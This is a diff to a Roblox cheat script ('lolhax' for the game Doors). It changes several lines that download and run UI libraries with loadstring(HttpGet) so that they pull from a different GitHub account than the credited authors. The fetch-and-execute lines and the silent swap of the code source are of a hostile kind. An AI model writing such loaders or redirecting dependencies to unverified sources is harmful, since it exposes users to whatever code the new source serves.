@@ -67,8 +67,8 @@
 -- credits to lolhax developers for creating and developing lolhax still 
 -- lolhax v2 used to be number 1 doors script on the market it fell off
 local Loadtime = tick()
-local Linoria = loadstring(game:HttpGet('https://raw.githubusercontent.com/mstudio45/LinoriaLib/main/Library.lua'))()
-local Obsidian = loadstring(game:HttpGet('https://raw.githubusercontent.com/deividcomsono/Obsidian/main/Library.lua'))()
+local Linoria = loadstring(game:HttpGet('https://raw.githubusercontent.com/tiwa244/LinoriaLib/main/Library.lua'))()
+local Obsidian = loadstring(game:HttpGet('https://raw.githubusercontent.com/tiwa244/Obsidian/main/Library.lua'))()
 local HttpService = game:GetService("HttpService")
 local foldername = "lolhax"
 local filename = foldername .. "/LibraryConfig.json"
@@ -180,7 +180,7 @@ local UIConfig = getgenv().UseLib
 local Repository, Library, Window, Tabs, Icons, ThemeManager, SaveManager, LinoriaNotify, Toggles, Options -- Defined at the top so they don't "vanish"
 
 if UIConfig.CurrentLib == "Linoria" then 
-    Repository = "https://raw.githubusercontent.com/mstudio45/LinoriaLib/main/"
+    Repository = "https://raw.githubusercontent.com/tiwa244/LinoriaLib/main/"
     Library = loadstring(game:HttpGet(Repository .. "Library.lua"))()
     
     ThemeManager = loadstring(game:HttpGet(Repository .. "addons/ThemeManager.lua"))()
@@ -204,7 +204,7 @@ if UIConfig.CurrentLib == "Linoria" then
     }
 
 elseif UIConfig.CurrentLib == "Obsidian" then
-    Repository = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
+    Repository = "https://raw.githubusercontent.com/tiwa244/Obsidian/main/"
     Library = loadstring(game:HttpGet(Repository .. "Library.lua"))()
     
     Icons = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/lucide-roblox-direct/refs/heads/main/source.lua"))()
